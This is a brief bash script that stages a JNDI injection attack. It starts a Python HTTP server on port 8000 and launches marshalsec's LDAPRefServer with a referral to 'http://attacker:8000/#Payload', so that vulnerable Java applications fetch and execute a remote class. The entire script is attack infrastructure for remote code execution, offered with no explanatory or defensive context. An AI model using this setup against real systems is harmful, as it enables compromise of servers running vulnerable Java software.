#!/bin/bash

echo "[*] Starting HTTP server..."
python3 -m http.server 8000 &

sleep 2

echo "[*] Starting LDAP server..."

java -cp marshalsec/marshalsec-*-all.jar \
 marshalsec.jndi.LDAPRefServer \
 http://attacker:8000/#Payload
